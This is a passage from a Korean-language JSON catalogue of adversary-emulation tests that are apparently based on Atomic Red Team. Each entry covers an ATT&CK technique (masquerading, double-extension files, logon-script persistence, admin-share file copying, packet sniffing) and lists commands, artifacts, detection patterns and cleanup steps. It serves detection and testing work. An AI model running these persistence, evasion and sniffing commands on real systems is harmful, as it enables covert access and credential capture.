        "입력 인자 source_file로 지정된 %SystemRoot%\\System32\\cmd.exe 가 실제로 존재해야 하며, 손상되지 않은 정상 cmd.exe 여야 한다.",
        "레지스트리 경로 HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 에 대한 쓰기 권한이 필요하다.",
        "보안 솔루션이나 그룹 정책이 Run 키 수정 또는 Temp/사용자 디렉터리로의 실행 파일 복사를 차단하지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\VEDetector.exe",
            "description": "기본 설정 기준으로 TEMP 경로에 생성되는, cmd.exe를 복사·이름 변경한 위장 실행 파일(#{ved_path}\\VEDetector.exe)."
          }
        ],
        "files_read": [
          {
            "path": "%SystemRoot%\\System32\\cmd.exe",
            "description": "복사 원본으로 사용된 정상 Windows 명령 프롬프트 실행 파일."
          }
        ],
        "registry_keys": [
          {
            "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\VEDetector",
            "description": "VEDetector.exe를 부팅 시 자동 실행하기 위한 Run 키 항목으로, 값 데이터에 VEDetector.exe 경로가 저장된다."
          }
        ],
        "processes": [
          {
            "name": "VEDetector.exe",
            "description": "실제로는 cmd.exe 바이너리이지만 이름만 변경된 위장 프로세스. 프로세스 트리와 이미지 경로를 통해 식별 가능.",
            "commandline_pattern": "*VEDetector.exe*"
          },
          {
            "name": "powershell.exe",
            "description": "cmd.exe 복사, 레지스트리 Run 키 생성 및 VEDetector.exe 실행을 담당한 PowerShell 프로세스.",
            "commandline_pattern": "*Copy-Item*VEDetector.exe* New-ItemProperty *HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "PowerShell에서 `Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"VEDetector\" -ErrorAction SilentlyContinue` 명령으로 Run 키를 제거한다.",
        "`Stop-Process -Name \"VEDetector\" -Force -ErrorAction SilentlyContinue` 로 실행 중인 VEDetector.exe 프로세스를 종료한다.",
        "`Remove-Item -Path \"#{ved_path}\\VEDetector.exe\" -Force -ErrorAction SilentlyContinue` 로 생성된 실행 파일을 삭제한다.",
        "테스트 후에는 Sysmon/Event Log 상의 프로세스 생성(ID 1), 레지스트리 수정(ID 13) 이벤트를 DFIR 용도로 보존하거나 필요 시 내보낸 뒤 환경을 초기 상태로 유지한다."
      ],
      "metadata": {
        "atomic_source_id": "03ae82a6-9fa0-465b-91df-124d8ca5c4e8"
      }
    }
  ]
},
{
  "technique_id": "T1036.007",
  "technique_name": "Masquerading: Double File Extension",
  "tactic": "Defense Evasion",
  "description": "이중 확장자(Double Extension)를 사용해 사용자가 문서·이미지·스크립트처럼 착각하도록 만드는 위장 기법이다. 예를 들어 QuarterlyReport.docx.exe, invoice.pdf.vbs처럼 앞부분은 정상 파일 확장자, 끝부분은 실행 가능 확장자를 붙여 실행 파일임을 숨긴다. 공격자는 이메일 첨부, 다운로드 폴더 등을 통해 사용자가 확장자를 보지 못하거나 아이콘만 보고 실행하게 만들어 악성 코드를 실행시킨다.",

  "tests": [
    {
      "test_id": "T1036.007-1",
      "name": "File Extension Masquerading",
      "platforms": ["windows"],
      "summary": "기본 calc.exe, VBS, PowerShell 스크립트를 복사해 docx.exe, pdf.exe, xls.vbs, png.vbs, doc.ps1 등 이중 확장자 파일로 %TEMP%에 생성한 뒤 순차적으로 실행한다. 사용자가 보기에는 문서·이미지·오피스 파일 같은 이름이지만 실제로는 실행 파일과 스크립트가 동작하는 상황을 재현한다.",
      "procedure": [
        "입력 인자 exe_path, vbs_path, ps1_path가 지정한 경로에 존재하는지(특히 VBS/PS1는 dependency에서) 확인한다.",
        "copy 명령을 사용해 #{exe_path}를 %TEMP%\\T1036.007_masquerading.docx.exe, .pdf.exe, .ps1.exe 등 이중 확장자 형태로 복사한다.",
        "동일하게 #{vbs_path}를 %TEMP%\\T1036.007_masquerading.xls.vbs, .xlsx.vbs, .png.vbs 로 복사하여 오피스/이미지 파일처럼 보이도록 만든다.",
        "또한 #{ps1_path}를 %TEMP%\\T1036.007_masquerading.doc.ps1, .pdf.ps1, .rtf.ps1 로 복사해 문서 파일 이름을 갖는 PowerShell 스크립트를 생성한다.",
        "%TEMP% 경로의 이중 확장자 exe, vbs, ps1 파일들을 순차적으로 실행해 calc.exe 인스턴스와 VBS/PowerShell 창이 여러 개 실행되는 상황을 만든다.",
        "cleanup 단계에서 생성된 모든 T1036.007_masquerading.* 이중 확장자 파일을 삭제한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "copy \"#{exe_path}\" %temp%\\T1036.007_masquerading.docx.exe /Y\r\ncopy \"#{exe_path}\" %temp%\\T1036.007_masquerading.pdf.exe /Y\r\ncopy \"#{exe_path}\" %temp%\\T1036.007_masquerading.ps1.exe /Y\r\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.xls.vbs /Y\r\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.xlsx.vbs /Y\r\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.png.vbs /Y\r\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.doc.ps1 /Y\r\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.pdf.ps1 /Y\r\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.rtf.ps1 /Y\r\n%temp%\\T1036.007_masquerading.docx.exe\r\n%temp%\\T1036.007_masquerading.pdf.exe\r\n%temp%\\T1036.007_masquerading.ps1.exe\r\n%temp%\\T1036.007_masquerading.xls.vbs\r\n%temp%\\T1036.007_masquerading.xlsx.vbs\r\n%temp%\\T1036.007_masquerading.png.vbs\r\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.doc.ps1\r\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.pdf.ps1\r\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.rtf.ps1"
        }
      ],
      "prerequisites": [
        "입력 인자 exe_path(기본: C:\\Windows\\System32\\calc.exe)가 실제로 존재해야 하며, 실행 권한이 있어야 한다.",
        "입력 인자 vbs_path, ps1_path로 지정된 VBS/PowerShell 스크립트가 존재해야 하며, 컴포넌트 내 dependency get_prereq_command를 통해 미리 다운로드되어 있어야 한다.",
        "%TEMP% 디렉터리에 파일을 생성·실행할 수 있는 권한이 필요하다.",
        "시스템이 Windows Script Host(.vbs)와 PowerShell 스크립트 실행을 허용해야 하며, 스크립트 실행 정책에 의해 차단되지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\T1036.007_masquerading.docx.exe",
            "description": "문서 파일처럼 보이도록 이름이 위장된 실행 파일(기본적으로 calc.exe 복사본)."
          },
          {
            "path": "%TEMP%\\T1036.007_masquerading.pdf.exe",
            "description": "PDF 파일처럼 보이도록 이름이 위장된 실행 파일."
          },
          {
            "path": "%TEMP%\\T1036.007_masquerading.ps1.exe",
            "description": "PowerShell 스크립트 확장자를 포함한 이중 확장자 exe 파일."
          },
          {
            "path": "%TEMP%\\T1036.007_masquerading.xls.vbs",
            "description": "Excel 파일처럼 보이지만 실제로는 VBScript인 이중 확장자 파일."
          },
          {
            "path": "%TEMP%\\T1036.007_masquerading.xlsx.vbs",
            "description": "xlsx 확장자를 포함해 위장된 VBScript 파일."
          },
          {
            "path": "%TEMP%\\T1036.007_masquerading.png.vbs",
            "description": "이미지 파일처럼 보이는 .png.vbs VBScript 파일."
          },
          {
            "path": "%TEMP%\\T1036.007_masquerading.doc.ps1",
            "description": "문서 파일 이름을 가진 PowerShell 스크립트 파일."
          },
          {
            "path": "%TEMP%\\T1036.007_masquerading.pdf.ps1",
            "description": "PDF 파일 이름을 가진 PowerShell 스크립트 파일."
          },
          {
            "path": "%TEMP%\\T1036.007_masquerading.rtf.ps1",
            "description": "RTF 문서처럼 보이도록 이름이 지정된 PowerShell 스크립트 파일."
          }
        ],
        "files_read": [
          {
            "path": "C:\\Windows\\System32\\calc.exe",
            "description": "기본 exe_path로 사용되는 정상 계산기 실행 파일로, 이중 확장자 exe를 만들기 위해 원본으로 읽힌다."
          },
          {
            "path": "PathToAtomicsFolder\\T1036.007\\src\\T1036.007_masquerading.vbs",
            "description": "여러 .vbs 이중 확장자 파일로 복사되는 원본 VBS 스크립트."
          },
          {
            "path": "PathToAtomicsFolder\\T1036.007\\src\\T1036.007_masquerading.ps1",
            "description": "여러 .ps1 이중 확장자 파일로 복사되는 원본 PowerShell 스크립트."
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "calc.exe",
            "description": "이중 확장자 *.docx.exe, *.pdf.exe, *.ps1.exe로 실행되는 계산기 프로세스(혹은 exe_path로 지정된 다른 실행 파일).",
            "commandline_pattern": "%TEMP%\\T1036.007_masquerading.*.exe"
          },
          {
            "name": "wscript.exe",
            "description": "이중 확장자 *.xls.vbs, *.xlsx.vbs, *.png.vbs 스크립트를 실행하는 Windows Script Host 프로세스.",
            "commandline_pattern": "%TEMP%\\T1036.007_masquerading.*.vbs"
          },
          {
            "name": "powershell.exe",
            "description": "이중 확장자 *.doc.ps1, *.pdf.ps1, *.rtf.ps1 스크립트를 -File 옵션으로 실행하는 PowerShell 프로세스.",
            "commandline_pattern": "powershell.exe -File %TEMP%\\T1036.007_masquerading.*.ps1"
          },
          {
            "name": "cmd.exe",
            "description": "copy, del 명령 등을 수행하고 각 이중 확장자 파일을 호출하는 명령 프롬프트 프로세스.",
            "commandline_pattern": "*T1036.007_masquerading*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "cmd에서 del /f %temp%\\T1036.007_masquerading.* 명령을 통해 생성된 모든 이중 확장자 파일을 삭제한다(스크립트 내 cleanup_command 참고).",
        "calc.exe, wscript.exe, powershell.exe 인스턴스가 남아 있을 경우 작업 관리자 또는 DFIR 도구를 사용해 수동으로 종료할 수 있다.",
        "이후 Temp 디렉터리와 최근 실행 목록, Prefetch, ShimCache, Amcache 등에서 관련 흔적을 수집·분석 후 테스트 흔적을 정리한다."
      ],
      "metadata": {
        "atomic_source_id": "c7fa0c3b-b57f-4cba-9118-863bf4e653fc"
      }
    }
  ]
},
{
  "technique_id": "T1037.001",
  "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Windows)",
  "tactic": "Persistence",
  "description": "Windows 사용자의 로그온 시점에 자동 실행되는 스크립트를 악용해 지속성을 확보하는 기법이다. 공격자는 배치 스크립트나 실행 파일 경로를 레지스트리(HKCU/HKLM) 로그온 스크립트 값에 등록하여, 사용자가 로그인할 때마다 원하는 명령이 자동으로 실행되도록 구성한다. 이를 통해 별도 서비스나 작업 스케줄러 없이도 은밀하게 명령 실행 및 환경 조작이 가능하다.",

  "tests": [
    {
      "test_id": "T1037.001-1",
      "name": "Logon Scripts via HKCU Environment UserInitMprLogonScript",
      "platforms": [
        "windows"
      ],
      "summary": "사용자 %TEMP% 디렉터리에 art.bat 배치 스크립트를 생성하고, HKCU\\Environment\\UserInitMprLogonScript 레지스트리 값을 통해 로그온 스크립트로 등록한다. 로그온 시 해당 스크립트는 사용자 데스크톱에 T1037.001-log.txt 파일을 생성하며, 이를 통해 레지스트리 기반 로그온 스크립트 지속성 시나리오를 모사한다.",
      "procedure": [
        "입력 인자 script_path(기본: %temp%\\art.bat)와 script_command 내용을 바탕으로 배치 파일을 생성한다.",
        "REG.exe를 사용해 HKCU\\Environment 키 아래 UserInitMprLogonScript 값에 배치 스크립트 경로를 등록한다.",
        "사용자가 로그오프 후 다시 로그온하면 UserInitMprLogonScript에 지정된 배치 스크립트가 실행된다.",
        "기본 script_command는 사용자 프로필 데스크톱에 T1037.001-log.txt 파일을 생성하며 로그 메시지를 추가한다.",
        "cleanup 단계에서는 레지스트리 값과 생성된 .bat 파일, 로그 파일을 삭제해 흔적을 정리한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "echo \"#{script_command}\" > #{script_path}\r\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f"
        }
      ],
      "prerequisites": [
        "테스트를 수행하는 계정의 HKCU\\Environment 레지스트리 키에 값을 추가할 수 있어야 한다(일반 사용자 계정 권한으로 가능).",
        "%TEMP% 경로에 배치 파일(art.bat)을 생성할 수 있는 쓰기 권한이 필요하다.",
        "Windows 로그온/로그오프를 수행할 수 있는 환경에서 테스트해야 UserInitMprLogonScript 실행을 실제로 확인할 수 있다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\art.bat",
            "description": "로그온 시 실행되도록 등록된 배치 스크립트. 기본적으로 echo 명령을 수행해 로그 파일에 메시지를 기록한다."
          },
          {
            "path": "%USERPROFILE%\\desktop\\T1037.001-log.txt",
            "description": "로그온 스크립트 실행 시 생성되는 로그 파일로, 테스트 성공 메시지가 기록된다."
          }
        ],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKCU\\Environment",
            "value_name": "UserInitMprLogonScript",
            "description": "사용자 로그온 시 실행할 스크립트 경로를 지정하는 값으로, 이 테스트에서는 %TEMP%\\art.bat를 가리킨다."
          }
        ],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "echo 명령으로 배치 스크립트를 생성하고 이후 로그온 시 배치 스크립트 실행을 담당하는 명령 프롬프트 프로세스.",
            "commandline_pattern": "echo * > %TEMP%\\art.bat"
          },
          {
            "name": "REG.exe",
            "description": "HKCU\\Environment\\UserInitMprLogonScript 레지스트리 값을 추가/삭제하는 데 사용된다.",
            "commandline_pattern": "REG.exe ADD HKCU\\Environment /v UserInitMprLogonScript*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "REG.exe DELETE HKCU\\Environment /v UserInitMprLogonScript /f 명령으로 로그온 스크립트 레지스트리 값을 제거한다.",
        "%TEMP%\\art.bat 배치 스크립트를 삭제해 더 이상 실행되지 않도록 한다.",
        "%USERPROFILE%\\desktop\\T1037.001-log.txt 로그 파일을 삭제해 테스트 실행 흔적을 정리한다."
      ],
      "metadata": {
        "atomic_source_id": "d6042746-07d4-4c92-9ad8-e644c114a231"
      }
    }
  ]
},
{
  "technique_id": "T1039",
  "technique_name": "Data from Network Shared Drive",
  "tactic": "Collection",
  "description": "네트워크 공유 드라이브(예: C$, 파일 서버 공유 등)에 저장된 데이터를 수집하는 기법이다. 공격자는 관리 공유나 사용자 공유에 접근해 민감 문서를 직접 복사하거나 스크립트·도구를 통해 자동 수집한다. 이를 통해 로컬에 존재하지 않는 내부 중요 자료를 한 번에 훑어보고, 이후 추가적인 유출(Exfiltration) 단계로 이어질 수 있다.",

  "tests": [
    {
      "test_id": "T1039-1",
      "name": "Copy a Sensitive File over Administrative Share with copy",
      "platforms": [
        "windows"
      ],
      "summary": "원격 시스템의 관리 공유(\\\\<remote>\\C$)에 있는 \"민감 파일\"을 copy 명령으로 로컬 %TEMP% 경로로 복사하는 시나리오이다. C$ 관리 공유 존재 여부와 대상 파일 존재 여부를 선행 조건으로 검사한 뒤, 로컬에 동일 내용을 가진 파일을 생성해 네트워크 공유 기반 데이터 수집을 모사한다.",
      "procedure": [
        "관리 공유가 활성화된 원격 호스트(기본: 127.0.0.1)에서 \\\\#{remote}\\C$ 경로 접근 여부를 확인한다.",
        "원격 경로 \\\\#{remote}\\C$\\#{share_file} 에 테스트용 파일을 생성해 \"민감 파일\"을 준비한다.",
        "cmd.exe copy 명령을 사용해 \\\\#{remote}\\C$\\#{share_file} 를 로컬 %TEMP%\\#{local_file} 경로로 복사한다.",
        "복사 완료 후 로컬 %TEMP% 경로에 새 파일이 생성되었는지 확인한다.",
        "정리 단계에서 원격 파일과 로컬에 복사된 파일을 삭제해 흔적을 제거한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "copy \\\\#{remote}\\C$\\#{share_file} %TEMP%\\#{local_file}"
        }
      ],
      "prerequisites": [
        "원격 시스템에서 C$ 관리 공유가 활성화되어 있어야 하며 \\\\#{remote}\\C$ 경로에 접근 가능해야 한다.",
        "\\\\#{remote}\\C$\\#{share_file} 경로에 대상 파일이 존재해야 한다(테스트에서는 Out-File 로 미리 생성).",
        "테스트를 수행하는 계정이 원격 C$ 공유 및 로컬 %TEMP% 경로에 대한 읽기/쓰기 권한을 가지고 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "\\\\#{remote}\\C$\\#{share_file}",
            "description": "원격 관리 공유 C$에 생성된 테스트용 \"민감 파일\"."
          },
          {
            "path": "%TEMP%\\#{local_file}",
            "description": "원격 공유에서 복사해 온 파일로, 네트워크 공유 기반 데이터 수집 흔적을 나타낸다."
          }
        ],
        "files_read": [
          {
            "path": "\\\\#{remote}\\C$\\#{share_file}",
            "description": "copy 명령 실행 시 원격 관리 공유에서 읽어 들인 원본 파일."
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "copy 명령을 이용해 네트워크 공유에서 로컬로 파일을 복사하는 데 사용된 프로세스.",
            "commandline_pattern": "copy \\\\*\\C$\\* %TEMP%\\*"
          }
        ],
        "network": [
          {
            "protocol": "SMB",
            "description": "\\\\#{remote}\\C$ 관리 공유 접근에 사용된 네트워크 파일 공유 트래픽."
          }
        ]
      },
      "cleanup": [
        "\\\\#{remote}\\C$\\#{share_file} 테스트 파일을 삭제해 원격 측 흔적을 제거한다.",
        "%TEMP%\\#{local_file} 로컬에 복사된 파일을 삭제해 수집 흔적을 정리한다."
      ],
      "metadata": {
        "atomic_source_id": "6ed67921-1774-44ba-bac6-adb51ed60660"
      }
    },
    {
      "test_id": "T1039-2",
      "name": "Copy a Sensitive File over Administrative Share with PowerShell",
      "platforms": [
        "windows"
      ],
      "summary": "PowerShell의 Copy-Item cmdlet을 사용해 원격 관리 공유(\\\\<remote>\\C$)에 있는 파일을 로컬 %TEMP% 경로로 복사한다. 첫 번째 테스트와 동일한 시나리오를 PowerShell 기반으로 구현한 형태로, SMB를 통한 네트워크 공유 데이터 수집을 모사한다.",
      "procedure": [
        "원격 시스템의 C$ 관리 공유(\\\\#{remote}\\C$) 존재 여부를 Test-Path로 확인한다.",
        "없을 경우 사용자에게 C$ 공유 활성화를 안내하고, 존재 시 \\\\#{remote}\\C$\\#{share_file} 위치에 테스트용 파일을 생성한다.",
        "PowerShell Copy-Item 을 사용해 \\\\#{remote}\\C$\\#{share_file} 를 $Env:TEMP\\#{local_file} 로 복사한다.",
        "로컬 TEMP 디렉터리에 새 파일이 생성되었는지 확인해 복사 성공 여부를 검증한다.",
        "cleanup 단계에서 원격 파일과 로컬에 복사된 파일을 Remove-Item 으로 삭제한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "copy-item -Path \"\\\\#{remote}\\C$\\#{share_file}\" -Destination \"$Env:TEMP\\#{local_file}\""
        }
      ],
      "prerequisites": [
        "원격 호스트에서 C$ 관리 공유가 활성화되어 있어야 한다(\\\\#{remote}\\C$ Test-Path 성공).",
        "\\\\#{remote}\\C$\\#{share_file} 경로에 대상 파일이 존재해야 하며, 필요 시 Out-File 로 미리 생성할 수 있다.",
        "테스트 계정이 해당 원격 공유 및 로컬 TEMP 디렉터리에 대한 접근·쓰기 권한을 보유해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "\\\\#{remote}\\C$\\#{share_file}",
            "description": "PowerShell Out-File 로 생성된 원격 테스트용 파일(민감 정보 파일을 모사)."
          },
          {
            "path": "%TEMP%\\#{local_file}",
            "description": "Copy-Item 으로 원격 관리 공유에서 복사된 로컬 파일."
          }
        ],
        "files_read": [
          {
            "path": "\\\\#{remote}\\C$\\#{share_file}",
            "description": "Copy-Item 실행 시 읽어 들인 원격 원본 파일."
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Copy-Item 을 이용해 원격 관리 공유에서 로컬 TEMP 디렉터리로 파일을 복사하는 스크립트 실행 프로세스.",
            "commandline_pattern": "copy-item -Path \\\\\\\\*\\C$\\* -Destination *TEMP*"
          }
        ],
        "network": [
          {
            "protocol": "SMB",
            "description": "PowerShell을 통한 \\\\#{remote}\\C$ 네트워크 공유 접근 트래픽."
          }
        ]
      },
      "cleanup": [
        "Remove-Item -Path \"\\\\#{remote}\\C$\\#{share_file}\" 명령으로 원격 테스트 파일을 삭제한다.",
        "Remove-Item -Path \"$Env:TEMP\\#{local_file}\" 명령으로 로컬에 복사된 파일을 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "7762e120-5879-44ff-97f8-008b401b9a98"
      }
    }
  ]
},
{
  "technique_id": "T1040",
  "technique_name": "Network Sniffing",
  "tactic": "Credential Access",
  "description": "네트워크 스니핑은 호스트나 네트워크 장비에서 네트워크 트래픽을 캡처하고 분석하여 자격 증명, 세션 토큰, 프로토콜 메타데이터 등의 민감 정보를 수집하는 기법이다. 공격자는 패킷 캡처 도구(tshark, netsh trace, pktmon, PowerShell 캡처 API 등)를 악용해 내부 네트워크 흐름을 파악하고, 인증 정보나 중요 데이터가 평문 또는 약하게 보호된 상태로 전송되는지 확인할 수 있다.",

  "tests": [
    {
      "test_id": "T1040-1",
      "name": "Packet Capture Windows Command Prompt (tshark)",
      "platforms": ["windows"],
      "summary": "Wireshark에 포함된 tshark.exe를 사용하여 지정한 인터페이스(Ethernet 등)에서 5개의 패킷을 캡처하는 테스트이다. 사전에 Wireshark와 Npcap이 설치되어 있어야 하며, 관리 권한으로 실행되는 환경을 가정한다.",
      "procedure": [
        "사전 조건으로 Wireshark가 설치되어 있고 tshark.exe가 기본 경로(기본값: c:\\\\Program Files\\\\Wireshark\\\\tshark.exe)에 존재하는지 확인한다.",
        "Npcap 드라이버가 설치되어 있고 C:\\\\Program Files\\\\Npcap\\\\npcap.sys 경로에 존재하는지 확인한다.",
        "필요 시 Invoke-WebRequest 를 이용해 Wireshark 설치 파일과 Npcap 설치 파일을 다운로드하고 조용히(/S) 설치한다.",
        "명령 프롬프트(관리자 권한)에서 tshark.exe -i #{interface} -c 5 를 실행하여 지정된 인터페이스에서 5개의 패킷을 캡처한다.",
        "명령이 완료되면 표준 출력에 캡처된 패킷 요약이 표시되며, 추가 아티팩트(PCAP 파일)는 생성하지 않는다(테스트 정의 기준)."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "\"c:\\\\Program Files\\\\Wireshark\\\\tshark.exe\" -i #{interface} -c 5"
        }
      ],
      "prerequisites": [
        "tshark.exe가 #{tshark_path} (기본: c:\\\\Program Files\\\\Wireshark\\\\tshark.exe)에 존재해야 한다.",
        "Npcap이 설치되어 있어야 하며 #{npcap_path} (기본: C:\\\\Program Files\\\\Npcap\\\\npcap.sys)가 존재해야 한다.",
        "테스트를 수행하는 계정은 패킷 캡처를 위한 관리자 권한을 가져야 한다.",
        "지정된 인터페이스 이름(기본값: Ethernet)이 실제 시스템 네트워크 인터페이스 이름과 일치해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "tshark.exe",
            "description": "지정된 네트워크 인터페이스에서 5개의 패킷을 캡처하는 CLI 기반 패킷 캡처 프로세스.",
            "commandline_pattern": "\"c:\\\\Program Files\\\\Wireshark\\\\tshark.exe\" -i * -c 5"
          }
        ],
        "network": [
          {
            "protocol": "N/A",
            "description": "tshark는 NIC에서 수신된 모든 프로토콜(예: TCP, UDP, ICMP)을 수동적으로 캡처하며, 별도의 전송 트래픽을 생성하지 않는다."
          }
        ]
      },
      "cleanup": [
        "추가적인 파일이나 레지스트리 변경이 없으므로 별도의 정리 작업은 필요 없다.",
        "테스트 중 생성한 Wireshark/Npcap 설치 파일이 있다면 PathToAtomicsFolder\\\\..\\\\ExternalPayloads 내 인스톨러 파일들을 수동으로 삭제할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "a5b2f6a0-24b4-493e-9590-c699f75723ca"
      }
    },
    {
      "test_id": "T1040-2",
      "name": "Windows Internal Packet Capture (netsh trace)",
      "platforms": ["windows"],
      "summary": "Windows 기본 제공 netsh trace 기능을 사용하여 네트워크 트레이스를 %TEMP%\\\\trace.etl 에 저장하고, 종료 시 trace.cab 로 패키징되는 동작을 모사한다. 내부 패킷 캡처 기능 악용 시나리오 탐지에 활용할 수 있다.",
      "procedure": [
        "관리자 권한 명령 프롬프트를 실행한다.",
        "netsh trace start capture=yes tracefile=%temp%\\\\trace.etl maxsize=10 명령을 실행해 네트워크 트레이스를 시작하고, 최대 10MB까지 기록하도록 설정한다.",
        "일정 시간 동안(테스트 정의상 별도 Sleep 없음) 시스템에서 네트워크 트래픽이 발생하도록 둔다.",
        "cleanup 단계에서 netsh trace stop 을 실행하여 캡처를 중지하고, 잠시 대기 후 %temp%\\\\trace.etl 및 %temp%\\\\trace.cab 파일을 삭제한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10"
        }
      ],
      "prerequisites": [
        "Windows 환경에서 netsh trace 기능을 사용할 수 있어야 한다(대부분의 최신 Windows 버전에 기본 포함).",
        "관리자 권한 CMD 또는 PowerShell 세션이 필요하다.",
        "%TEMP% 디렉터리에 파일을 생성/삭제할 수 있는 권한이 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\trace.etl",
            "description": "netsh trace start 로 생성된 이벤트 트레이스 로그 파일(네트워크 및 기타 이벤트 포함)."
          },
          {
            "path": "%TEMP%\\trace.cab",
            "description": "netsh trace stop 후 생성될 수 있는 cab 압축 파일로, trace.etl 등 트레이스 아티팩트를 포함한다."
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "netsh.exe",
            "description": "내부 네트워크 트레이스를 시작/종료하는 데 사용된 시스템 유틸리티.",
            "commandline_pattern": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10"
          }
        ],
        "network": [
          {
            "protocol": "N/A",
            "description": "netsh trace는 패시브 캡처를 수행하며 자체적으로 별도의 네트워크 트래픽을 생성하지 않는다."
          }
        ]
      },
      "cleanup": [
        "netsh trace stop >nul 2>&1",
        "TIMEOUT /T 5 >nul 2>&1",
        "del %temp%\\trace.etl >nul 2>&1",
        "del %temp%\\trace.cab >nul 2>&1"
      ],
      "metadata": {
        "atomic_source_id": "b5656f67-d67f-4de8-8e62-b5581630f528"
      }
    },
    {
      "test_id": "T1040-3",
      "name": "Windows Internal Packet Capture with pktmon",
      "platforms": ["windows"],
      "summary": "Windows 10/Server 2019 이후 포함된 pktmon.exe(로컬 패킷 모니터)를 사용해 etw 기반 패킷 캡처를 시작하고, 일정 시간 후 중지한 뒤 로그를 %TEMP%\\\\t1040.etl 파일로 저장하는 시나리오이다.",
      "procedure": [
        "관리자 권한 명령 프롬프트를 실행한다.",
        "pktmon.exe start --etw -f %TEMP%\\t1040.etl 명령으로 ETW 기반 패킷 캡처를 시작하고 출력 파일을 %TEMP%\\t1040.etl 로 지정한다.",
        "TIMEOUT /T 5 명령을 통해 약 5초간 캡처를 진행하도록 대기한다.",
        "pktmon.exe stop 명령으로 캡처를 중지한다.",
        "cleanup 단계에서 %TEMP%\\t1040.etl 파일을 삭제한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl\nTIMEOUT /T 5 >nul 2>&1\npktmon.exe stop"
        }
      ],
      "prerequisites": [
        "시스템에 pktmon.exe가 존재해야 한다(일부 Windows 버전에서만 기본 포함).",
        "관리자 권한이 필요하며, ETW 기반 패킷 캡처를 시작할 수 있어야 한다.",
        "%TEMP% 경로에 파일 생성/삭제 권한이 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\t1040.etl",
            "description": "pktmon.exe start 명령 실행 시 생성되는 ETL 로그 파일로, 캡처된 패킷 및 이벤트가 포함된다."
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "pktmon.exe",
            "description": "Windows 내장 패킷 모니터 유틸리티로, ETW 기반 패킷 캡처를 수행한다.",
            "commandline_pattern": "pktmon.exe start --etw -f %TEMP%\\t1040.etl"
          }
        ],
        "network": [
          {
            "protocol": "N/A",
            "description": "pktmon 역시 패시브 캡처 도구로, 별도의 추가 네트워크 트래픽을 생성하지 않고 NIC에서 흐르는 트래픽을 관찰만 한다."
          }
        ]
      },
      "cleanup": [
        "del %TEMP%\\t1040.etl"
      ],
      "metadata": {
        "atomic_source_id": "c67ba807-f48b-446e-b955-e4928cd1bf91"
      }
    },
    {
      "test_id": "T1040-4",
      "name": "Windows Internal pktmon Set Filter",
      "platforms": ["windows"],
      "summary": "pktmon.exe filter add -p 445 명령을 사용해 TCP/UDP 포트 445(SMB 트래픽)에 대한 필터를 설정하는 테스트이다. 실제 캡처는 수행하지 않고, 캡처 전에 수행되는 필터 설정 단계만 모사한다.",
      "procedure": [
        "관리자 권한 CMD를 실행한다.",
        "pktmon.exe filter add -p 445 명령으로 포트 445에 대한 패킷 필터를 추가한다.",
        "필요 시 pktmon filter list 를 사용해 필터 설정을 확인할 수 있다(테스트 정의에는 포함되지 않음).",
        "cleanup 단계에서 pktmon filter remove 명령으로 모든 필터를 제거하여 원래 상태로 되돌린다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "pktmon.exe filter add -p 445"
        }
      ],
      "prerequisites": [
        "시스템에 pktmon.exe가 존재해야 한다.",
